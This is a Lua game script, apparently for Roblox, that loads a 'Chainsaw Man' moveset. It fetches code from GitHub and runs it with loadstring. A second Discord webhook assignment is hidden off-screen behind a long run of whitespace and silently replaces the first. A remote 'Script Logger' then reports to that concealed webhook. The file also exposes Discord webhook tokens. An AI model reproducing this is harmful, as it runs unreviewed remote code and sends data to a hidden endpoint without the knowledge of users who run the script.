local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
local ScriptName = "Friedpotato Chainsaw Man";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dFYW8OHpzEs2kIZumPyidNpISe_o0-";
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)

local MainAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/friedpotato/refs/heads/main/API/MAIN%20API.lua"))()
local api = MainAPI:LoadTsbgAPI()
local Main = api:CreateMoveset("Chainsaw Man")
api:SetSupportedHeroes({"Hero Hunter"})
api:Load()
Main:LoadChainsawMan()
